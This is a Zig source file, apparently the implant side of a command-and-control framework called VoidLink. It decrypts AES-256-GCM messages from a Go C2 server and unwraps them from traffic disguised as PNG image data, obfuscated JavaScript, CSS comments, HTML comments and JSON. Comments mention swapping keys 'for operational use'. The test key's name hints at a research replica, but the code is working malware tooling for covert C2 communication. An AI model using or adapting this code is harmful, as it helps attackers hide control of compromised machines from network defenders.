//! VoidStream protocol — camouflage unwrapping + AES-256-GCM decryption.
//! Matches the Go C2 server's VoidStream encoding exactly.
const std = @import("std");
const Aes256Gcm = std.crypto.aead.aes_gcm.Aes256Gcm;
const Sha256 = std.crypto.hash.sha2.Sha256;
const build_options = @import("build_options");
const config = @import("config.zig");

// PAYLOAD SWAP: Replace this shared secret with a per-deployment key or implement
// key exchange (e.g., ECDH) for operational use. Must match c2/internal/protocol/voidstream.go.
pub const SHARED_SECRET = "de-voidlink-test-key-do-not-use";
pub const NONCE_SIZE: usize = 12;
pub const TAG_SIZE: usize = 16;
pub const LENGTH_SIZE: usize = 4;

// ── Key Derivation ──────────────────────────────────────────────────────

/// Derive 32-byte AES key from shared secret via SHA-256.
pub fn deriveKey() [32]u8 {
    var key: [32]u8 = undefined;
    if (comptime build_options.operational) {
        const secret = std.posix.getenv("VOIDLINK_SECRET") orelse blk: {
            config.jsonLog("warn", "voidstream", "\"msg\":\"VOIDLINK_SECRET not set, using insecure default key\"");
            break :blk "CHANGE-ME-INSECURE-DEFAULT";
        };
        Sha256.hash(secret, &key, .{});
    } else {
        Sha256.hash(SHARED_SECRET, &key, .{});
    }
    return key;
}

// ── AES-256-GCM Decryption ──────────────────────────────────────────────

/// Decrypt a VoidStream message.
/// Wire format: [4-byte BE length][12-byte nonce][ciphertext || 16-byte GCM tag]
/// Returns plaintext length written to `out`.
pub fn decrypt(msg: []const u8, out: []u8) !usize {
    // Need at least length + nonce + tag
    const min_size = LENGTH_SIZE + NONCE_SIZE + TAG_SIZE;
    if (msg.len < min_size) return error.MessageTooShort;

    // Parse 4-byte big-endian length prefix
    const payload_len = readU32BE(msg[0..4]);

    // Validate: length field should cover nonce + ciphertext + tag
    if (LENGTH_SIZE + payload_len > msg.len) return error.LengthMismatch;

    const payload = msg[LENGTH_SIZE .. LENGTH_SIZE + payload_len];

    // payload = nonce(12) || ciphertext || tag(16)
    if (payload.len < NONCE_SIZE + TAG_SIZE) return error.PayloadTooShort;

    const nonce: [NONCE_SIZE]u8 = payload[0..NONCE_SIZE].*;
    const sealed = payload[NONCE_SIZE..]; // ciphertext || tag

    // Go's Seal appends tag after ciphertext
    const ct_len = sealed.len - TAG_SIZE;
    const ciphertext = sealed[0..ct_len];
    const tag: [TAG_SIZE]u8 = sealed[ct_len..][0..TAG_SIZE].*;

    if (out.len < ct_len) return error.OutputTooSmall;

    const key = deriveKey();
    Aes256Gcm.decrypt(out[0..ct_len], ciphertext, tag, "", nonce, key) catch return error.DecryptionFailed;

    return ct_len;
}

// ── XOR Encoding ────────────────────────────────────────────────────────

/// XOR-decode each byte with the VoidLink XOR key (0xAA).
pub fn xorDecode(data: []const u8, out: []u8) void {
    const len = @min(data.len, out.len);
    for (0..len) |i| {
        out[i] = data[i] ^ config.XOR_KEY;
    }
}

// ── Camouflage Unwrapping ───────────────────────────────────────────────

/// Detect camouflage mode from Content-Type and extract the encrypted payload.
/// Returns bytes written to `out`.
pub fn unwrapCamouflage(content_type: []const u8, body: []const u8, out: []u8) !usize {
    if (contains(content_type, "image/png")) {
        return unwrapPng(body, out);
    } else if (contains(content_type, "application/javascript") or contains(content_type, "text/javascript")) {
        return unwrapJavascript(body, out);
    } else if (contains(content_type, "text/css")) {
        return unwrapCss(body, out);
    } else if (contains(content_type, "text/html")) {
        return unwrapHtml(body, out);
    } else if (contains(content_type, "application/json")) {
        return unwrapJson(body, out);
    }
    // No camouflage detected — assume raw encrypted data
    if (out.len < body.len) return error.OutputTooSmall;
    @memcpy(out[0..body.len], body);
    return body.len;
}

/// Full pipeline: unwrap camouflage then decrypt.
pub fn processResponse(content_type: []const u8, body: []const u8, out: []u8) !usize {
    var unwrap_buf: [65536]u8 = undefined;
    const unwrapped_len = try unwrapCamouflage(content_type, body, &unwrap_buf);
    return try decrypt(unwrap_buf[0..unwrapped_len], out);
}

// ── PNG Unwrap ──────────────────────────────────────────────────────────

/// Extract IDAT chunk data from a PNG byte stream.
/// PNG: 8-byte sig, then chunks: [4-byte BE len][4-byte type][data][4-byte CRC]
fn unwrapPng(body: []const u8, out: []u8) !usize {
    // Skip 8-byte PNG signature
    if (body.len < 8) return error.InvalidPng;
    var pos: usize = 8;

    while (pos + 8 <= body.len) {
        const chunk_len = readU32BE(body[pos..][0..4]);
        const chunk_type = body[pos + 4 ..][0..4];
        pos += 8; // past length + type

        if (std.mem.eql(u8, chunk_type, "IDAT")) {
            if (chunk_len > body.len - pos) return error.InvalidPng;
            if (chunk_len > out.len) return error.OutputTooSmall;
            @memcpy(out[0..chunk_len], body[pos..][0..chunk_len]);
            return chunk_len;
        }

        // Skip data + 4-byte CRC
        const skip = chunk_len + 4;
        if (skip > body.len - pos) break;
        pos += skip;
    }
    return error.IdatNotFound;
}

// ── JavaScript Unwrap ───────────────────────────────────────────────────

/// Extract base64 from: var _0x=["<BASE64>"];
fn unwrapJavascript(body: []const u8, out: []u8) !usize {
    const start_marker = "[\"";
    const end_marker = "\"];";
    return extractAndDecodeBase64(body, start_marker, end_marker, out);
}

// ── CSS Unwrap ──────────────────────────────────────────────────────────

/// Extract base64 from: /* font-data: <BASE64> */
fn unwrapCss(body: []const u8, out: []u8) !usize {
    const start_marker = "font-data: ";
    const end_marker = " */";
    return extractAndDecodeBase64(body, start_marker, end_marker, out);
}

// ── HTML Unwrap ─────────────────────────────────────────────────────────

/// Extract base64 from: <!-- <BASE64> -->
fn unwrapHtml(body: []const u8, out: []u8) !usize {
    const start_marker = "<!-- ";
    const end_marker = " -->";
    return extractAndDecodeBase64(body, start_marker, end_marker, out);
}

// ── JSON Unwrap ─────────────────────────────────────────────────────────

/// Extract base64 from: {"data":"<BASE64>","status":"ok"}
fn unwrapJson(body: []const u8, out: []u8) !usize {
    const start_marker = "\"data\":\"";
    const end_marker = "\",\"status\"";
    return extractAndDecodeBase64(body, start_marker, end_marker, out);
}

// ── Helpers ─────────────────────────────────────────────────────────────

/// Find base64 payload between markers, decode it into `out`.
fn extractAndDecodeBase64(
    body: []const u8,
    start_marker: []const u8,
    end_marker: []const u8,
    out: []u8,
) !usize {
    const start_pos = std.mem.indexOf(u8, body, start_marker) orelse return error.MarkerNotFound;
    const b64_start = start_pos + start_marker.len;
    if (b64_start >= body.len) return error.MarkerNotFound;

    const end_pos = std.mem.indexOfPos(u8, body, b64_start, end_marker) orelse return error.MarkerNotFound;
    const b64_data = body[b64_start..end_pos];

    if (b64_data.len == 0) return error.EmptyPayload;

    const decoded_len = std.base64.standard.Decoder.calcSizeForSlice(b64_data) catch return error.InvalidBase64;
    if (decoded_len > out.len) return error.OutputTooSmall;

    std.base64.standard.Decoder.decode(out[0..decoded_len], b64_data) catch return error.InvalidBase64;
    return decoded_len;
}

/// Read a 4-byte big-endian u32.
fn readU32BE(bytes: *const [4]u8) u32 {
    return (@as(u32, bytes[0]) << 24) |
        (@as(u32, bytes[1]) << 16) |
        (@as(u32, bytes[2]) << 8) |
        @as(u32, bytes[3]);
}

/// Check if haystack contains needle.
fn contains(haystack: []const u8, needle: []const u8) bool {
    return std.mem.indexOf(u8, haystack, needle) != null;
}
